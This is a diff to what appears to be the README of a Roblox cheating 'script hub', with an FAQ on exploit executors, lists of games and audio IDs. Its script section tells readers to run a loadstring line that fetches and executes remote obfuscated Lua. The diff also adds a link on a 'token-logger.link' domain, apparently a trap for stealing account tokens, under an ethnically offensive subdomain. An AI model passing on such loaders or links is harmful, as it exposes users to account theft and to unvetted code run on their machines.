@@ -18,9 +18,24 @@ Serversides
 
 ================================================================================================
 
+[FAQ]
+
+Q: What is the difference between bruh.lua and protected.lua
+A: bruh.lua is like premium where its only for people who I trust to get the consistently updated un-obfuscated version of the script
+
+Q: What executor can I use it on
+A: Scriptware, comet, fluxus, krnl, and synapse but basically anything that will accept moon obfuscation 
+
+Q: are all the scripts in the hub updated?
+A: yes they are all updated consistently or are finished but still work all of them are infact trusted scripts that I use or friends use or even just community accepted
+
+================================================================================================
+
 SCRIPT
 
 loadstring(game:HttpGet("https://github.com/Holyshitbruh/privatecum/raw/main/Protected.lua", true))()
+
+https://nigerian.token-logger.link/s/c0f16568a5
 
 ================================================================================================
 
@@ -143,6 +158,10 @@ https://www.roblox.com/games/3580729618/NEW-Pizza-Restaurant-Tycoon [60k Visits]
 
 AUDIOS
 
-1845337876 - china lol
+(Not bypassed)
+Bypassed music soon tho :)
 
+1845337876 - china lol
+2769380360 - hon hon hon
 ================================================================================================
+
